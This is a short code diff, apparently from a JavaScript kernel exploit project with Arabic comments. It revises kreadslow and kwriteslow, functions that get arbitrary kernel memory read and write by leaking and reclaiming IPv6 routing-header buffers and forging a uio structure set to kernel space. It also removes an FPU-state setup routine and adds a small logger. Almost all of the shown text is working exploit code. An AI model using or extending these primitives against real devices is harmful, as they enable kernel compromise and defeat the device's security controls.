@@ -240,6 +240,10 @@ safe(kernel, 'kernel');
 safe(utils, 'utils');
 safe(jsmaf, 'jsmaf');
 
+// fallback logger to satisfy eslint
+var _log = function(msg: any) {
+  try { console.log(msg); } catch(e) {}
+};
 /* ===========================
   *   Worker Creation
   * ===========================
@@ -802,12 +806,6 @@ function cleanup() {
   * ===========================
   */
 
-function init_threading() {
-  var jmpbuf = malloc(0x60);
-  setjmp(jmpbuf);
-  saved_fpu_ctrl = Number(read32(jmpbuf.add(0x40)));
-  saved_mxcsr = Number(read32(jmpbuf.add(0x44)));
-}
 var LOG_MAX_LINES = 38;
 var LOG_COLORS = ['#FF6B6B', '#FFA94D', '#FFD93D', '#6BCF7F', '#4DABF7', '#9775FA', '#DA77F2'];
 function setup_log_screen() {
@@ -1527,7 +1525,6 @@ function kreadslow64_safe(address) {
   }
   return read64(buffer);
 }
-
 function build_uio(uio, uio_td, read, addr, size) {
   // خليه self-contained: uio + أول iovec في نفس البافر
 
@@ -1622,11 +1619,11 @@ function kreadslow(addr, size) {
     return BigInt_Error;
   }
 
-  var uio_iov = read64(leak_rthdr);
+  // بعد ما تجيب uio_iov من leak_rthdr مش محتاجه هنا
+  // var uio_iov = read64(leak_rthdr);
 
-  // هنا أهم نقطة: استخدم msgIov زي الأصلي
-  build_uio(uio_buf, uio_iov, 0, true, addr, size);   // read = true
-
+  // استخدم uio_buf self-contained
+  build_uio(uio_buf, 0, true, addr, size);
   // Stage2: تثبيت uio_segflg = UIO_SYSSPACE
   free_rthdr(ipv6_socks[triplets[2]]);
   var iov_leak_add = leak_rthdr.add(0x20);
@@ -1765,11 +1762,10 @@ function kwriteslow(addr, buffer, size) {
     wait_uio_readv();
   }
 
-  var uio_iov = read64(leak_rthdr);
-
   // var uio_iov = read64(leak_rthdr);
 
   build_uio(uio_buf, 0, false, addr, size);
+
   // Stage2: reclaim iov
   free_rthdr(ipv6_socks[triplets[2]]);
   var iov_leak_add = leak_rthdr.add(0x20);
